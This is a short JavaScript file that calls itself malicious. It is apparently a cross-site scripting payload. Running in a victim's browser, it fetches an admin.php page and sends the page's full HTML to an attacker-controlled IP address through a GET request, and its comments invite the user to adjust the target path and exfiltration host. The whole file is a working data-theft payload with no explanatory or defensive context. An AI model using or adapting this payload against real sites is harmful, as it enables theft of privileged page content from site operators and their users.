// malicious JavaScript file
path = "admin.php"; // adjust the path, you might need the add the whole URL including the https://

fetch(path).then(function (response) {
    return response.text();
}).then(function (html) {
    let url = "http://192.168.32.133/content"; // change the IP
    let params = "?url=" + encodeURIComponent(path) + "&content=" + encodeURIComponent(html);
    fetch(url + params, {
        method: "GET"
    });
}).catch(function (err) {
    console.warn('Something went wrong.', err);
});
